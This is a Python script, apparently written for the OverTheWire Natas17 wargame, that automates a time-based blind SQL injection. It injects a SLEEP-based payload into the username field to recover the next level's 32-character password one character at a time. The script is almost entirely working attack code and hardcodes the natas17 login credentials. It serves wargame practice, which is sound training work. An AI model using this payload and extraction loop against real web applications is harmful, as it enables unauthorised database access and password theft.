#This script help to perform timebased sql injection on natas17-18 challenge
#The totally blind sql injection exist in this challenge,so only way to extract information using sql injection is 
#using true,false with corresponds to time taken by requests.
#the main motive of this script is not to disclose the solution of this challenge.
#!/usr/bin/python3
import requests
from time import *
import sys
def response_server(url,authent,data):
	try:
		req = requests.post(url,auth=authent,data=data)
		if req.status_code == 200:
			return(req.elapsed.total_seconds())
	except Exception as e:
		print(e)	

def request_server(url,authent):
	chars_list = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	pass18 = ""
	start = 0
	while len(pass18)!=32:
		for char in chars_list:
			data='''natas18" and password like BINARY'{}%' and SLEEP(8)# '''.format(pass18+char)
			data_query={"username":data}
			print("[Found %d > %s]\tTrying '%s'"%(start,pass18,char),end="  ")
			response = response_server(url,authent,data_query)
			print("[Timetaken :: %ssec]"%response)
			if response>6:
				pass18=pass18+char
				start=start+1
		if len(pass18)==32:
			print("")
			print("[+]Password found for natas18 ",pass18)
			break
			sys.exit(4)		
if __name__== "__main__":
	print("")
	print("TIME BASED BLIND SQL INJECTION ON NATAS17-18")
	print("\t\t\t-written by krn_bhargav")
	sleep(5)
	url = "http://natas17.natas.labs.overthewire.org/index.php"
	usernamenatas17 = "natas17"
	passwordnatas17 = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
	authent =requests.auth.HTTPBasicAuth(usernamenatas17,passwordnatas17)
	request_server(url,authent)